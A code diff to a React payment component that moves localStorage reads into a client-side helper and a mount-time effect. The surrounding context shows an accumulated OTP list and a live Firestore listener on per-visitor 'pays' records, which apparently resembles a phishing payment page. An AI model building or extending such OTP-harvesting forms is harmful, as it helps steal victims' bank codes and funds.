@@ -102,12 +102,20 @@ const BANKS = [
   },
 ]
 
+// Helper function to safely access localStorage
+const getLocalStorage = (key: string) => {
+  if (typeof window !== "undefined") {
+    return localStorage.getItem(key)
+  }
+  return null
+}
+
 export const Payment = (props: any) => {
   const handleSubmit = async () => {}
 
   const [step, setstep] = useState(1)
   const [isloading, setIsloading] = useState(false)
-  const [amount, sedAmount] = useState( localStorage.getItem("amount"))
+  const [amount, setAmount] = useState("5") // Default value
   const [newotp] = useState([""])
   const [countdown, setCountdown] = useState(180) // 3 minutes countdown
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
@@ -123,6 +131,14 @@ export const Payment = (props: any) => {
     prefix: "",
     status: "new",
   })
+
+  // Load localStorage values after component mounts (client-side only)
+  useEffect(() => {
+    const storedAmount = getLocalStorage("amount")
+    if (storedAmount) {
+      setAmount(storedAmount)
+    }
+  }, [])
 
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
@@ -155,9 +171,6 @@ export const Payment = (props: any) => {
     return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
   }
 
-  useEffect(() => {
-  }, [])
-
   // Countdown timer for OTP screen
   useEffect(() => {
     let timer: NodeJS.Timeout
@@ -178,8 +191,8 @@ export const Payment = (props: any) => {
   }, [step, countdown])
 
   useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")
-    
+    const visitorId = getLocalStorage("visitor")
+
     if (visitorId) {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
